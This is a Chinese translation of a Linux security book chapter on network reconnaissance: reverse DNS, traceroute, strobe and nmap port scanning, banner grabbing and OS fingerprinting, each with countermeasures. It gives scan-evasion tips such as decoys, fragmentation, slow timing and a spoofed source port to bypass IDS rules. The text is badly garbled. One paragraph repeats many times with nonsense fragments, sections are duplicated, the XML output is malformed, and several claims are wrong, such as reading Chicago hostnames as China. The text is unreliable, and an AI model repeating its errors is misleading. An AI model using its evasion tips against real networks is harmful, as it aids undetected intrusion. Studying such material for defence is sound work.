## 反向查询

| 流行性: | 7 |

|---|---|

| 简单性: | 8 |

| 影响: | 7 |

| 风险等级: | 7 |

反向查询是获取 `172.26.105.85` 这种 IP 地址的方式：

```
machine$ host 172.26.105.85
85.105.26.172.IN-ARPA name pointer 172.26.105.85.example.com
```

![](img/33829ffb1435b4baef56fcd2c28ec6cd_115_0.png)

## 映射你的机器和网络

如果他们知道（通过邮件）`172.26.105.85`。黑客就可以对这些 IP 地址进行反向查询以获取主机名。

## 反向查询防御措施

你应该为所有 IP 地址提供 `PTR` 记录，以匹配主机名。然而，你不需要反向查询结果是 `172.26.105.85`。相反，考虑使用主机名，例如 "`172.26.105.85`"：

```
machine$ host 172.26.105.85
85.105.26.172.IN-ARPA name pointer 172.26.105.85.example.com
```

这防止了反向查询泄露主机名。我们建议对所有 IP 地址都这样做，即使是未使用的。这种一致性确保了黑客无法获取主机名信息，但不会阻碍你的功能。

确保包含一个匹配所有的正向查询。如果 IP 地址的正向和反向条目不匹配，TCP 封装器将拒绝你的连接。你应该能够查询 `ftps`、`172.26.105.85` 和 `172.26.105.85` 并获得合理的查询答案，如下：

如果你采用这样的系统，你必须确保你的正向（主机到 IP）映射是有效的，可以在你的 DNS 文件中使用重复 A 记录（不佳）或使用 `CNAME`（我们的偏好）。使用 `CNAME`，你的正向区域看起来如下：

```
ftpserver                IN CNAME  172.26.105.85
172.26.105.85            IN A       172.26.105.85
```

并且你的反向区域中的条目如下：

```
$ORIGIN 172.26.172.IN-ARPA
85 PTR                  172.26.105.85.example.com
```

## DNSSEC

DNS 对互联网至关重要——没有它，就无法解析域名，你只能与那些你已经在本地存储了其 IP 地址的机器进行通信。然而，在 DNS 规范中并没有包含任何安全机制。例如，黑客可以向 DNS 查询返回响应，如果他的响应在真实响应之前被接收，他就可以控制你连接的终端节点。我们将在第 7 章中讨论一些 DNS 不安全性的示例。

从 1997 年开始，出现了一项旨在在 DNS 中实现安全性和身份验证的运动，并命名为 `DNSSEC`。虽然这可以帮助防御我们稍后描述的攻击，但它并不能防止上述列出的情况。所使用的方法只是对你的 BIND 服务器进行简单查询，即使你在你的服务器上实施了 `DNSSEC`，黑客所寻求的响应仍然会存在。这并不意味着 `DNSSEC` 不是一件好事；只是不要认为它是解决所有 DNS 问题的“灵丹妙药”。

# 追踪 (TRACEROUTES)

对于黑客来说，了解机器的位置（无论是在互联网上还是物理位置）是非常用的。如果黑客希望从被攻破的机器发起拒绝服务攻击（DoS），那么在靠近 DOS 目标的机器上获取 root 权限将使攻击更有效。如果他希望攻破一台机器作为后续攻击的起点，那么选择一个具有快速互联网访问而非低速介质的机器将是理想的。

![](img/33829ffb1435b4baef56fcd2c28ec6cd_119_0.png)

| 流行度: | 8 |

| 简单性: | 9 |

| 影响: | 5 |

| 风险等级: | 7 |

`Traceroute` 是一种工具，允许你确定连接在通往目的地经过了哪些机器。它通过发送具有递增 `TTL`（存活时间）的 UDP 数据包（范围在 33435 到 33524 之间）和 ICMP 超回复来工作。`TTL` 定义了数据包在丢弃之前应该经过多少台机器；通过将第一个包的 `TTL` 设置为 1，你可以获取第一个跳数；通过将第二个包 设置为 2，你可以获取第二个跳数，依此类推。

这里有一个从黑客机器到潜在目标的追踪示例：

```
hackerbox# traceroute target.example.com
1 hacker-firewall.hack_er.edu (192.168.2.1) 2.892 ms 2.803 ms 2.746 ms
2 hacker-gateway.hack_er.edu (171.678.90.1) 3.881 ms 3.789 ms 3.686 ms
```

# 第 3 章：映射你的机器和网络

- t3-p3_isp_net.net (171.678.1.186) 3.779 ms 3.806 ms 3.623 ms

- t4-p3_isp_net.net (171.678.1.110) 28.767 ms 12.297 ms 14.101 ms

- sl-bb20-jp-phone.com.net (171.572.1.36) 9.444 ms 12.483 ms 20.579 ms

- sl-gw13-sea_phone.com.net (198.292.10.2) 12.179 ms 16.209 ms 13.084 ms

- sj-28-cable_com.com (172.18.3.85) 6.842 ms 10.206 ms 20.131 ms

- 18.19.10.28 (172.19.10.28) 33.346 ms 26.674 ms 23.739 ms

- chicago-d01_fast_net.org (144.298.1.317) 27.176 ms 16.056 ms 11.519 ms

- chi-cust02_fast_net.org (144.298.9.214) 51.638 ms 49.019 ms 48.873 ms

- chi-01-dnet-t1.fast_net.org (144.298.18.42) 57.561 ms 88.786 ms 46.046 ms

- cisco.example.com (254.192.1.20) 158.888 ms 161.422 ms 160.884 ms

- thromedown.example.com (254.192.1.29) 168.650 ms 183.821 ms 173.287 ms

- target.example.com (254.192.1.88) 122.819 ms 87.835 ms 104.117 ms

我们从 `traceroute` 中学到的内容包括以下：

- **目标的 ISP** 使用 `fast_net.org` 接入互联网。访问目标可能会更容易入侵其他机器。通过查看 FastNet 看看他们的警觉程度，黑客将知道自己是否会在不被监视的情况下面临入侵。

- **目标的位置**：通过主机 `chi-cust-02` 和 `chi-01-dnet-t1`，黑客可以推测该机器在中国。也可以使用其他工具来确认这一状态。

- **目标的带宽**：主机 `chi-01-dnet-t1.fast_net.org` 可能是网络设备。考虑到 "`T1`" 是名称的一部分，我们可以推测他们是以 T1 兆比特每秒的速度连接的。



- **目标的设备**：流量通过 `example.com` 时包含一个路由器 (`cisco.example.com`) 和可能还有一个防火墙 (`thorne.example.com`)。任何熟悉各种防火墙的人可能都会怀疑这很有趣。

| 流行度: | 7 |
| 简单性: | 9 |
| 影响: | 6 |
| 风险等级: | 7 |

`Matt's Traceroute` 是 `traceroute` 的改进版本。它不使用 `UDP`，而是使用具有递增 `TTL` 的 `ICMP` 请求包，这意味着它将遍历从源到目的地的网络设备，以提供实时的平均和高/低吞吐量测量。以下是列出的两台机器之间的示例：

| 主机名 | 数据包 | 丢失率 % | 接收 | 发送 | 最后最佳 | 最差 |
|---|---|---|---|---|---|---|
| 1. hacker-firewall.hack_er.edu | 0% | 29 | 29 | 2 | 3 |
| 2. hacker-gateway.hack_er.edu | 0% | 29 | 33 | 4 | 13 |
| 3. t1-p3_isp_net | 0% | 29 | 43 | 7 | 78 |
| 4. t3-p3_isp_net | 0% | 29 | 40 | 12 | 34 |
| 5. sl-bb20-jp-phone.com.net | 0% | 29 | 54 | 10 | |
| 6. sl-gw13-sea_phone.com.net | 0% | 29 | 94 | 45 | |
| 7. sj-28-cable_com.com | 0% | 29 | 14 | 33 | |
| 8. 18.19.10.28 | 0% | 29 | 15 | 12 | |
| 9. chicago-d01_fast_net.org | 0% | 29 | 24 | 25 | |
| 10. chi-cust02_fast_net.org | 0% | 29 | 23 | 58 | |
| 11. chi-01-dnet-t1.fast_net.org | 0% | 29 | 124 | 160 | |
| 12. cisco.example.com | 0% | 29 | 158 | 187 | |
| 13. thromedown.example.com | 0% | 29 | 259 | 185 | |
| 14. target.example.com | 0% | 29 | | | |

*(注：由于原文表格数据在某些行显示不完整或存在异常，译文保持数据结构一致)*

# 追踪防护措施

两种形式的追踪都依赖于 `ICMP` 超时响应。黑客可以向 `DNS` 查询发送响应，例如，在真实响应到达之前接收他的响应。另一种方法是拒绝 `UDP` 数据（（在 `33435` 到 `33524` 范围））。

# 攻防破解：Linux 安全秘密与解决方案

```
target.example.com [192.168.0.28] 13 (daytime) : Connection refused
target.example.com [192.168.0.28] 18 (msp) : Connection refused
target.example.com [192.168.0.28] 19 (chargen) : Connection refused
target.example.com [192.168.0.28] 21 (fsp) : Connection refused
target.example.com [192.168.0.28] 37 (time) : open
target.example.com [192.168.0.28] 50 (re-mail-ck) : Connection refused
target.example.com [192.168.0.28] 53 (domain) : open
target.example.com [192.168.0.28] 70 (gopher) : Connection refused
target.example.com [192.168.0.28] 69 (tftp) : Connection refused
target.example.com [192.168.0.28] 68 (bootpc) : Connection refused
target.example.com [192.168.0.28] 67 (bootps) : open
```

在此处你可以看到多个服务（`echo`, `discard`, `time`, `domain` 和 `bootps`）正在 `UDP` 端口上监听。

## Strobe

| 流行度: | 8 |
| :--- | :--- |
| 简单性: | 9 |
| 影响力: | 6 |
| 风险评分: | 8 |

`Strobe` 是由 `Julian Assange` 开发的，旨在成为一个高效的端口扫描工具。它尝试使用最大带宽和最少资源来扫描主机。它会快速进行并行扫描。自自豪的是，`strobe` 可以在具有合理数量 `socket` 的机器上进行页面读取，`strobe` 的速度足够扫描整个互联网子域名。如果网络后端的快速机器使用动态 `socket` 分配，或者大幅增加了其静态分配（检查你的内核选项），则可以在合理的时间内调查整个小国家。在这一非常有限的应用中，`strobe` 速度比 `SS2.1`（由 `clause@iss.net` 及其好友开发的高质量商业扫描扫描）或 `PingWave`（同样为商业）更快。

`Strobe` 仅能够扫描 `TCP` 端口。它有不同的报告输出，取决于你想要多少信息。默认报告端口号、端口名（它从 `strobe.services` 文件获取，该文件是 `/etc/services` 的更详细副本）以及从连接中收到的任何 `banner`：

```
hackerbox$/_strobe target.example.net
strobe 1.04 (c) 1995-1997 Julian Assange (prof@suburbia.net)
localhost 22 ssh Secure Shell RSA encrypted rsh(
SSH-1.5-1.2.27\n
localhost 25 smtp Simple Mail Transfer [102,JBP] ->
220 mail.example.net ESMTP Sendmail 8.9.3/8.9.3; 05 Feb 2000 00:58:38
```

![](img/33829ffb1435b4baef56fcd2c28ec6cd_123_0.png)

# 第 3 章：映射你的机器和网络

```
localhost 143 imap2 Interim Mail Access Protocol v2 [MRC] ->
* OK mail.example.net IMAP4rev1 v12.261 server ready/r\n
localhost 36953 unassigned unknown
localhost 32787 unassigned unknown
localhost 53 domain Name Server [81,95,PM1]
localhost 111 sunprpc rpcbind SUN Remote Procedure Call
localhost 993 unassigned unknown
localhost 995 unassigned unknown
localhost 6010 unassigned unknown
localhost 6011 unassigned unknown
localhost 6012 unassigned unknown
localhost 6013 unassigned unknown
localhost 9999 unassigned unknown
```

某些服务（如 `SMTP`、`IMAP` 等）会在连接时立即输出数据以识别它们。。如果有这些数据，`strobe` 会将其列在字符之后。这有助于你验证守护进程是否在端口上运行。`strobe` 有许多实用的选项：

- `-b` # 起始端口号。
- `-e` # 结束端口号。
- `-p` # 仅扫描此端口。
- `-t` # 连接尝试的超时。
- `-A` 用于发送出站连接请求的接口地址（对多网主机很有帮助）。
- `-V` 详细输出。
- `-s` 显示统计平均值。
- `-f` 快速扫描文件中列出的端口（`strobe.services` 或 `/etc/services`）。
- `-P` 用作源的本地端口。（例如，将其设置为 `22`，可以使扫描看起来与 `ssh` 有关，你可能会绕过某些 `IDS` 规则。）

`Strobe` 是一个手手且快速的工具。它已经多年没有更新了，而且可能也不会更新，正如分发版中所讨论的，发布者（`prof@suburbia.net`）已经转向了此类类型的其他项目（例如 `Go`），并且并不打算发布另一个版本。然而，它还有一些细微的新功能。当我应用他们的补丁时，我弄坏了一些本不该不再在 `strobe` 上工作且本应存在那里的功能。

# 攻防破解：Linux 安全秘密与解决方案



尽管它不再维护，但 `strobe` 仍然是一个由于实用性和历史价值而值得提及的工具。

# 第 3 章：映射你的机器和网络

## Nmap—端口扫描

| 流行度 | 10 |
| :--- | :--- |
| 简单性 | 9 |
| 影响力 | 8 |
| 风险评分 | 9 |

`Nmap` 是目前可用的最佳端口扫描器。称其为实际上是轻描淡写，因为它包含了多得的功能。我们在这里关注 `Nmap` 的端口扫描能力，但在其他地方将介绍 `Nmap` 的 OS 探测、RPC 识别和 ping 扫描。`Nmap` 几乎支持任何程序使用或实现的每种端口扫描方法。它涵盖了从简单的 TCP `connect()` 方法（三次握手和关闭连接）、使用原始 IP 数据包的各种隐身模式，甚至还有 FTP 嗅弹扫描。表 3-1 列出了各种模式。

| 类型 | 参数 | 描述 |
| :--- | :--- | :--- |
| Connect | `-sT` | 完整的 TCP `connect()` 扫描。这是非 root 用户运行时的默认且唯一的扫描方法。 |
| Stealth SYN | `-sS` | 发送单个 SYN 包——不完成 TCP 握手。如果收到 SYN/ACK，则说明端口开启。这通常被称为半开放扫描。 |

表 3-1. `Nmap` 支持的扫描

| 类型 | 参数 | 描述 |
| :--- | :--- | :--- |
| FIN | `-sF` | FIN 扫描。发送一个裸 FIN 包。如果收到 RST，则端口关闭。如果什么都没有收到，则端口必须开启。这种方法对防火墙很难被检测。 |
| Xmas Tree | `-sX` | Xmas 树扫描。与 FIN 扫描相同，但设置了 URG 和 PUSH 标志。 |
| Null | `-sN` | 空扫描。与 FIN 扫描相同，但使用没有任何标志的包。 |
| UDP | `-sU` | UDP 扫描。`Nmap` 向目标的每个端口发送 0 字节包。如果收到 ICMP 端口不可达，则端口关闭。这种扫描通常非常缓慢，由于 RFC 1812 限制了 ICMP 错误率。相反，`Nmap` 将检测主机使用的速率并相应地放慢扫描速度。 |
| IP protocol | `-s` | IP 协议扫描。确定目标支持哪些 IP 协议。`Nmap` 为每个协议发送原始 IP 包。如果收到 ICMP 协议不可达，则该协议不支持。某些操作系统和防火墙不发送 ICMP 包，所有协议似乎都支持。 |

表 3-1. `Nmap` 支持的扫描（续）

| 类型 | 参数 | 描述 |
| :--- | :--- | :--- |
| ACK | `-SA` | ACK 扫描。这种扫描有助于映射防火墙中启用的规则集，并确定防火墙是状态的还是简单的 SYN 阻塞过滤器。`Nmap` 向每个端口发送 ACK 包，通常表示成功接收包。由于没有建立连接，如果防火墙未过滤，应该返回 RST 包。 |
| Window size | `-SW` | 窗口大小扫描。这种扫描与 ACK 扫描类似，使用 TCP 窗口大小判断端口是开启、过滤还是未过滤。幸运的是 Linux 不容易，但你的防火墙可能会。 |
| RPC | `-SR` | RPC 扫描 |
| OS | `-O` | OS 探测 |

表 3-1. `Nmap` 支持的扫描（续）

某些防火墙会阻止其保护网络上受限端口的 SYN 包。在这种情况下，可能更适合 FIN、Xmas Tree 和 Null 扫描。这些方法更难检测。除了支持的扫描外，`Nmap` 还有多种配置选项来控制扫描的执行，如表 3-2 所示。

表 3-2. 常用 `Nmap` 配置选项

| 参数 | 描述 |
| :--- | :--- |
| `-PO` | 通常 `Nmap` 在扫描之前会 ping 主机。如果你知道一台机器正在运行，或者怀疑它正在阻止 ICMP ping 包，请使用此标志强制扫描任何。 |

| 参数 | 说明 |
| --- | --- |
| `-I` | 反向 ident 扫描。`Nmap` 将连接到端口（使用全连接）——在此模式下隐藏扫描将不起作用；如果连接，它将查询目标上的 identd 服务器，这可以让你知道 root或其他用户是否绑定了端口。 |
| `-f` | 分片扫描。TCP 数据包可以被分分成更小的片段，并在主机处进行重组。许多数据包过滤器和防火墙不会重组数据包，并可能允许这些本不应通过的数据包通过，扫描可能会绕过入侵检测软件。 |
| `-V` | 详细模式。 |
| `-VV` | 极其详细模式。如果你想查看 `Nmap` 数据包的内部，就用这个。 |
| `-D` | 诱饵主机。伪装成列出的主机名同时发送扫描。由于你的主机在虚构主机列表中，你可能会隐藏在噪声中。如果 `Nmap` 扫描主机与目标之间阻止了伪造的 IP 数据包，这些诱饵数据包将无法到达目标。 |
| `-T` | 计时策略。由于某些扫描检测器会在给定时间内等待数量不适当的数据包，使用较慢的扫描可以击败这些检测器。选项从 Paranoid（偏执狂）到 Insane（疯狂），后者每 5 分钟仅发送一个数据包，等待探测超时 0.3 秒，并因其速度导致信息丢失。 |

表 3-2 常用 `Nmap` 配置选项（续）

你还可以使用许多其他选项；表 3-2 中仅列出了最常用的。例如，`Nmap` 可以使用 `-o` 标志输出多种不同的格式，包括 XML、"grepable"文本，甚至还有为脚本小子（script-kids）提供的未记录的 `-os` 格式。Fyodor 显然很有幽默感。以下是 `Nmap` XML 输出的示例，安全管理员和黑客都可以轻松解析：



```xml
<?xml version="1.0" ?>
<!-- Nmap (V. 2.54BETA7) scan initiated Dec 29 12:22:51 2000 as:
Nmap -sR -oX Nmap.xml -sX localhost --
<Nmap scanner="Nmap" args="Nmap -sR -oX Nmap.xml -sX localhost"
start="978121371" version="2.54BETA7" xmloutputversion="1.0">

<scaninfo type="xmas" numservices="1534"
services="1026,1030-1032,1058-1059,1067-1080,1083-1084,1103,
1190-1110,1112,1127,1155,1178,1212,1212,1224,1241,1248,1346-1381,
1383-1552,1640,1650-1662,1651-1762,1723,1827-1986-2028-2030,2032-2035,
2038-2040,2094-2064,2065-2067,2105-2106,2118-2111-2212,2201,2220,2232,
2241,2301,2307,2401,2430-2433,2500-2501,2640-2605,2621-2605,2728,2776,2378,
3840,3001-3005-3006-3049,3064,3086,3128,3141,3264,3360,3333,3389,
3421,3455-3457,3462,3902,3996-3984,3956,4048,4045-4132-4133-4134,4321,4339,
4339,4344,4440,4557,4657,4672,5002-5000-5010-5011-5045,5145,5193-5193,5236,5236,5300,5305-5305,5438,5510,5520,5540,5550,5565,5631-5632-5680,
5713-5717,5800-5801,5902-5957,5979-5977,6009-6050,6105-6106,
6110-6112,6141-6148,6556,6666-6668,6969,7000-7010,7100,7200-7231,7226,
8007,8009,8080-8082,8888,8892,9090,9100,9535,9876,9991-9992,10005,
10028-10083,11371,12345-12346,17007,18000,20005,22273,22289,23205,
23221,23270,26208,27165,33137,32770-32780,32786,32787,43188,47557,
54220,65301/>
<verbose level="0" />
<debugging level="0" />
<host status="open">
  <address left="127.0.0.1" type="ipv4" />
  <hostnames><hostname name="localhost.localdomain" type="PTR" /></hostnames>
  <port protocol="tcp" portid="22"><state="open">
    <service name="ssh" method="table" conf="3" />
  </port>
  <port protocol="tcp" portid="111"><state="open">
    <service name="rpcbind" method="rpc" rpcnum="100000" lower="2"
    highver="2" method="detection" conf="5" />
  </port>
  <port protocol="tcp" portid="515"><state="open">
    <service name="printer" method="table" conf="3" />
  </port>
  <port protocol="tcp" portid="1024"><state="open">
    <service name="kdm" method="table" conf="3" />
  </port>
  <port protocol="tcp" portid="1032"><state="open">
    <service name="iad3" method="table" conf="3" />
  </port>
  <port protocol="tcp" portid="5801"><state="open">
    <service name="vnc" method="table" conf="3" />
  </port>
  <port protocol="tcp" portid="5901"><state="open">
    <service name="vnc-1" method="table" conf="3" />
  </port>
  <port protocol="tcp" portid="6000"><state="open">
</host>
```

# 第3章：映射你的机器和网络

`Nmap` 还附带了 `Nmap-fe`（`Nmap Front End`）。这本质上是一个图形用户界面（GUI），提供了一种通过点击构建 `Nmap` 命令行选项的方法。它没有提供任何命令行版本没有的功能，但我们不能错过获得一张漂亮截图的机会，如图 3-1 所示。

![](img/33829ffb1435bbaef56cd228ec6cd_130_0.png)

图 3-1 运行中的 `Nmap Front End`

# 揭露的 Linux：Linux 安全秘密与解决方案

玩玩 `Nmap` 以对其能力有良好的良好，你可以从中中学到很多知识——不仅是关于你的系统，还有关于网络。

# 端口扫描应对措施

第 2 章详细描述了几种端口扫描检测器。这些是极佳的工具，可以在黑客对你的机器感兴趣时提前让你知道，允许你监控或采取措施防止他们的行动。

上述工具可以防止某些扫描。`SYN` 扫描（又名半开放扫描）通常由防火墙自动保护。它们也可以被 `synlogger`、`Courtney` 和 `PortS` 等扫描检测器记录。更晦门的 `FIN`、`Xmas Tree` 和 `Null` 扫描在没有真正的 `IDS` 软件的情况下难以检测。

要防止反向 `ident` 扫描，只需在你的服务器上关闭 `ident`。然而，开启 `ident` 可能会影响对需要 `ident` 的服务的出站连接。例如，`Sendmail` 会进行带有 30 秒超时时间的 `ident` 查询，这会导致在发送出站邮件时出现停顿。

你应该确保你的内核编译时带有 `CONFIG_IP_ALWAYS_DEFRAG` 选项，或者通过 `echo 1>/proc/sys/net/ipv4/ip_always_defrag` 动态启用它。这确保了在发送数据包之前会对分片数据包进行完全去碎片。调整 `/proc/sys/net/ipfrag/` 中的值有助于缓解。

确保你的防火墙和内核阻止源路由数据包。这可以防止你看到源路由诱饵数据包，并让你知道扫描的实际来源。以下脚本将配置所有接口拒绝此类数据包：

```bash
#!/bin/sh
for interface in /proc/sys/net/ipv4/conf/*
do
  echo 0 > $interface/accept_source_route
done
```

## 操作系统检测

黑客在尝试入侵你的机器之前，采取的最节省时间的步骤之一是确定你运行的是什么操作系统。通过确定你的操作系统，他可以缩小他将尝试的攻击范围。例如，在 `MacOS` 上尝试 `sendmail` 漏洞是徒劳的，或者对 `Linux` 机器尝试缓冲区溢出也是如此。如果特定攻击可能会导致可能受影响的服务崩溃，它既会宣告入侵的发生，又使得在服务重启之前无法再次尝试入侵。

## SNMP 应对措施

除非需要，否则不要运行 `SNMP`，并确保选择难以猜解的团体字符串（`community strings`）。使用访问控制列表（`access lists`）限制哪些机器可以与你的机器进行 `SNMP` 通信，并运行更安全的 `SNMPv2` 或更高版本的协议。更多细节，请参阅本章节后的“简单网络管理协议 (`SNMP`)”部分。

## 网络横幅 (Banners)

| 流行度 | 7 |

| :--- | :--- |

| 简单性 | 8 |

| 影响力 | 6 |

| 风险评分 | 7 |

许多服务在您连接时会显示欢迎横幅（`banners`）。例如，`Sendmail` 横幅通常的形式如下：

```
220 example.org SMTP Sendmail 8.10.1/8.10.1; 19 Apr 2000 04:43:00
```



横幅不仅宣布该机器正在运行 `sendmail`（因此很可能是一个 UNIX 机器），还指示了软件版本（8.10.1）。黑客现在可以将攻击限制在影响特定版本的范围内。然而，他并不确定该机器运行的具体是什么操作系统。

通常，默认横幅（由 `/etc/issue` 提供）会告诉你运行的 Linux 版本和架构：

```
Red Hat Linux release 6.2 (Zoot)
Kernel 2.2.14-12 on i686
```

在这里，黑客现在知道该机器运行在 Intel（或克隆）处理器上的 Linux，因此他不需要尝试任何针对 Sparc 或 Alpha 的特定攻击。此外，该内核是一个旧版本，包含已知漏洞（例如功能漏洞 capabilities bug），这将有助于他针对性地攻击。

## 网络横幅应对措施

从你的系统中移除横幅。由于可用的网络软件种类众多，我们无法列出所有可能的方法，但下面描述了其中几种。

- **`/etc/issue`**: 此文件会呈现给通过 telnet 连接到你机器的用户。从此文件中删除主机特定信息，或者更好的办法是，即某些操作系统喜欢在启动时重写此文件，因此你可能需要关闭此项“功能”，或者简单地执行 `cat +i /etc/issue`。顺便关闭 telnet 并安装 ssh。

- **`sendmail`**: 编辑 `/etc/sendmail.cf` 文件中的 `SmtpGreetingMessage` 选项，将 `O SmtpGreetingMessage=$j Sendmail $v/$S; $b` 修改为虚构的内容，例如 `O SmtpGreetingMessage=$j GenericMail 4.19.00; $b`，这将伪装成非 sendmail 守护而不公布你真实的版本号。其他邮件程序（如 postfix 和 qmail）也有类似的选项。示例见第 11 章。

检查横幅的其他方法：连接到你的各种端口，查看它们提供的信息，并确定可以通过哪些配置更改或重新编译来消除它们。在做出更改后，建议你停止并重启服务，然后再次检查横幅。你可能甚至想以后重启一次以万无一一。这将确保更改永久生效。本章之前提到的 Strobe 内置了横幅检查功能。

## 活跃栈指纹 (Active Stack Fingerprinting)

可能最有趣且可靠的操作系统检测方法涉及向主机发送构造的 IP 数据包并检查其响应。TCP/IP 定义对于正常情况非常严格。但在处理畸形包时，响应并不总是定义的。TCP 包的某些部分对于所有用途都没有定义值。正是在这些情况下，操作系统通常会表现得不同——但在符合标准的范围内——你可以利用此（基于各种版本的预期响应列表）来确定运行的是什么操作系统和版本。

| 流行度 | 8 |
| :--- | :--- |
| 简单性 | 9 |
| 影响力 | 7 |
| 风险评分 | 8 |

`Ques` 是第一个稳健的栈指纹工具。它由 apostle.org 的 Savage 编写，也是首个获取扫描代码本身 OS 签名的工具（这是一个巨大的改进，因为你无需重新编译即可添加签名）。

要运行 `queso`，只需将其指向一个开放端口即可。这里我们使用你的端口：

```
hackerbox# /queso -d p 22 victim
Starting 172.16.87:5541 -> 192.168.18.20:24
IN #0 : 22->55441 S: A: +1 W:7F8B U: P: SYN ACK
IN #1 : 22->55442 S: A: 0 W:0000 U: P: RST
IN #3 : 22->55444 S: A: 0 W:0000 U: P: RST
IN #4 : 22->55445 S: A: +1 W:7F8B U: P: SYN ACK
IN #6 : 22->55447 S: A: +1 W:7F8B U: P: SYN ACK
192.168.18.20:422 * Linux.xx
```

![](img/33829ffb1435b4baef56fcd2c28ec6cd_134_0.png)

## 破译 Linux：Linux 安全秘密与解决方案

这台机器实际上运行的是 2.2.16。由于最新版本的 `queso` 是在 9/22 ，指纹数据库过时并不令人意外。“IN” 行显示了对特殊构造数据包的响应。

### Nmap—OS 检测

| 流行度 | 9 |
| :--- | :--- |
| 简单性 |  |
| 影响力 | 8 |
| 风险评分 | 9 |

本章贯穿提到的 `Nmap` 内置了 OS 检测。`Nmap` 的 OS 检测是目前可用最好的。它会定期更新新签名。事实上，当它无法找到匹配项时，它会获取有关如何将指纹提交到数据库供大家使用的指令。在本书编写时，它包含超过 500 个指纹，包含了各种测试：

- 带有选项的 SYN 包
- 带有选项的 NULL 包
- 带有选项的 SYN|FIN|URG 包
- 带有选项的 ACK 包
- 带有选项的 ACK 包
- 带有选项的 FIN|PUSH|URG 包
- 带有选项的 UDP 包

使用 `Nmap` 不需要了解这些任何含义，讨论每种方法超本书的范围。如果你感兴趣，请阅读 `Nmap` 手册中的 `Nmap-fingerprinting-article`。如果你不是 IP 大师，买一本 Richard Stevens 编写的《TCP/IP Illustrated》。如果你感兴趣，讨论每种方法超本书的范围。如果你不是 IP 大师，买一本 Richard Stevens 编写的《TCP/IP Illustrated》。

如果你感兴趣，请阅读 `Nmap` 手册中的 `Nmap-fingerprinting-article`。如果你不是 IP 大师，买一本 Richard Stevens 编写的《TCP/IP Illustrated》。

如果你感兴趣，请阅读 `Nmap` 手册中的 `Nmap-fingerprinting-article`。如果你不是 IP 大师，买一本 Richard Stevens 编写的《TCP/IP Illustrated》。

如果你感兴趣，请阅读 `Nmap` 手册中的 `Nmap-fingerprinting-article`。如果你不是 IP 大师，买一本 Richard Stevens 编写的《TCP/IP Illustrated》。

如果你感兴趣，请阅读 `Nmap` 手册中的 `Nmap-fingerprinting-article`。如果你不是 IP 大师，买一本 Richard Stevens 编写的《TCP/IP Illustrated》。

如果你感兴趣，请阅读 `Nmap` 手册中的 `Nmap-fingerprinting-article`。如果你不是 IP 大师，买一本 Richard Stevens 编写的《TCP/IP Illustrated》。

如果你感兴趣，请阅读 `Nmap` 手册中的 `Nmap-fingerprinting-article`。如果你不是 IP 大师，买一本 Richard Stevens 编写的《TCP/IP Illustrated》。

如果你感兴趣，请阅读 `Nmap` 手册中的 `Nmap-fingerprinting-article`。如果你不是 IP 大师，买一本 Richard Stevens 编写的《TCP/IP Illustrated》。

如果你感兴趣，请阅读 `Nmap` 手册中的 `Nmap-fingerprinting-article`。如果你不是 IP 大师，买一本 Richard Stevens 编写的《TCP/IP Illustrated》。

如果你感兴趣，请阅读 `Nmap` 手册中的 `Nmap-fingerprinting-article`。如果你不是 IP 大师，买一本 Richard Stevens 编写的《TCP/IP Illustrated》。

如果你感兴趣，请阅读 `Nmap` 手册中的 `Nmap-fingerprinting-article`。如果你不是 IP 大师，买一本 Richard Stevens 编写的《TCP/IP Illustrated》。

如果你感兴趣，请阅读 `Nmap` 手册中的 `Nmap-fingerprinting-article`。如果你不是 IP 大师，买一本 Richard Stevens 编写的《TCP/IP Illustrated》。

如果你对不起                  。如果你感兴趣，请阅读 `Nmap` 手册中的 `Nmap-fingerprinting-article`。如果你不是 IP 大师，买一本 Richard Stevens 编写的《TCP/IP Illustrated》。

如果你对不起                 。如果你感兴趣，请阅读 `Nmap` 手册中的 `Nmap-fingerprinting-article`。如果你不是 IP 大师，买一本 Richard Stevens 编写的《TCP/IP Illustrated》。



如果你对不起 。如果你感兴趣，请阅读 Nmap 手册中的 `Nmap-fingerprinting-article`。如果你不是 IP 大师，买一本 Richard Stevens 编写的《TCP/IP Illustrated》。

如果你对不起 。如果你感兴趣，请阅读 Nmap 手册中的 `Nmap-fingerprinting-article`。如果你不是 IP 大师，买一本 Richard Stevens 编写的《TCP/IP Illustrated》。

如果你对不起 。 更多细节，请参阅本章节后的“Simple-Network Management Protocol (SNMP)”部分。

如果你 不起 。

```
hackerbox# /queso -d p 22 victim
Starting 172.16.87:5541 -> 192.168.18.20:24
IN #0 : 22->55441 S: A: +1 W:7F8B U: P: SYN ACK
IN #1 : 22->55442 S: A: 0 W:0000 U: P: RST
IN #3 : 22->55444 S: A: 0 W:0000 U: P: RST
IN #4 : 22->55445 S: A: +1 W:7F8B U: P: SYN ACK
IN #6 : 22->55447 S: A: +1 W:7F8B U: P: SYN ACK
192.168.18.20:422 * Linux.xx
```

![](img/33829ffb1435b4baef56fcd2c28ec6cd_134_0.png)

### Nmap—OS 检测

| 流行度 | 9 |
| :--- | :--- |
| 简单性 |  |
| 影响力 | 8 |
| 风险评分 | 9 |

`Nmap`，本章贯穿提到的 `Nmap` 内置了 OS 检测。`Nmap` 的 OS 检测是目前可用最好的。它会定期更新新签名。事实上，当它无法找到匹配项时，它会获取有关如何将指纹提交到数据库供大家使用的指令。在本书编写时，它包含超过 500 个指纹，包含了各种测试：

- 带有选项的 SYN 包
- 带有选项的 NULL 包
- 带有选项的 SYN|FIN|URG 包
- 带有选项的 ACK 包
- 带有选项的 ACK 包
- 带有选项的 FIN|PUSH|URG 包
- 带有选项的 UDP 包

使用 `Nmap` 不需要了解这些任何含义，且讨论每种方法超本书的范围。如果你感兴趣，请阅读 Nmap 手册中的 `Nmap-fingerprinting-article`。如果你不是 IP 大师，买一本 Richard Stevens 编写的《TCP/IP Illustrated》。

# 第3 章：映射你的机器和网络

对于端口 22，它是开启的，而端口 1 是关闭的且都没有被防火墙拦截。

| 端口 | 状态 | 服务 |
| :--- | :--- | :--- |
| 22/tcp | open | ssh |
| 25/tcp | open | smtp |
| 515/tcp | open | printer |
| 6000/tcp | open | X11 |

TCP 序列预测：Class=random 难度=372815（好运！）序列号：FA40E9 FA40E9 F72DEB F72DEB 100486 远程操作系统猜测：Linux 2.1.23 - 2.2.16

OS 指纹：

TSeq(Class=R2pc11IS=3EB11)

T1(Res=YDF-NF W=7F53 ACK=S Flags=AS MENWW)

T2(Res=N)

T3(Res=YDF-NF W=7F53 ACK=S Flags=AS MENWW)

T4(Res=YDF-NF W=0 ACK=0 Flags=R)

T5(Res=YDF-NF W=0 ACK=0 Flags=AR)

